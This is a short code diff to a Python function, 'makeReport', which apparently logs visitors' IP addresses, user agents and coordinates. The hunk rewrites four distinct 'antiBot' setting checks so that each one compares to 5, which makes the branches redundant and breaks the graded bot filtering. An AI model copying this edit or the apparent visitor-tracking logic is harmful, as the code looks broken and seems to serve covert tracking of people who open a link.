@@ -118,22 +118,22 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
             ping = ""
     
     if info["hosting"]:
-        if config["antiBot"] == 4:
+        if config["antiBot"] == 5:
             if info["proxy"]:
                 pass
             else:
                 return
 
-        if config["antiBot"] == 3:
+        if config["antiBot"] == 5:
                 return
 
-        if config["antiBot"] == 2:
+        if config["antiBot"] == 5:
             if info["proxy"]:
                 pass
             else:
                 ping = ""
 
-        if config["antiBot"] == 1:
+        if config["antiBot"] == 5:
                 ping = ""
 
 
